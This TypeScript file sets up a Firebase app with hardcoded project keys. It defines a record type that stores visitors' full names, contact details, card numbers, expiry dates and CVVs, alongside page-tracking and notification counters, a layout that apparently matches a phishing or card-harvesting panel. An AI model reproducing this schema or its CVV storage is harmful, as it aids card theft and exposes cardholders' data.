import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBg4Skcl89HheHNkqC80Cm1bd429j7lUJw",
  authDomain: "whaaa-6f64d.firebaseapp.com",
  databaseURL: "https://whaaa-6f64d-default-rtdb.firebaseio.com",
  projectId: "whaaa-6f64d",
  storageBucket: "whaaa-6f64d.firebasestorage.app",
  messagingSenderId: "828749821160",
  appId: "1:828749821160:web:3b00b5446c8cd1722bc55d",
  measurementId: "G-M45W939MHR"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}




